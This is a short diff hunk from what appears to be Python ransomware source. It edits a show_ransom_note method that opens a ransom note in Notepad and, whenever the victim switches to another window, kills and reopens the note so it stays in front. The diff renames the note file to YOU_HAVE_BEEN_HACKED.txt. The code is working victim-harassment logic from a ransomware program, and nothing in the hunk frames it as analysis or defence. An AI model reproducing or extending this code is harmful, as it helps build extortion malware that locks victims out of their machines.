@@ -150,18 +150,18 @@ HEED THIS WARNING:
 ''')
 
     def show_ransom_note(self):
-        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
+        ransom = subprocess.Popen(['notepad.exe', 'YOU_HAVE_BEEN_HACKED.txt'])
         count = 0
         while True:
             time.sleep(0.1)
             top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-            if top_window == 'RANSOM_NOTE - Notepad':
+            if top_window == 'YOU_HAVE_BEEN_HACKED - Notepad':
                 pass
             else:
                 time.sleep(0.1)
                 ransom.kill()
                 time.sleep(0.1)
-                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
+                ransom = subprocess.Popen(['notepad.exe', 'YOU_HAVE_BEEN_HACKED.txt'])
             time.sleep(60)
             count +=1 
             if count == 5:
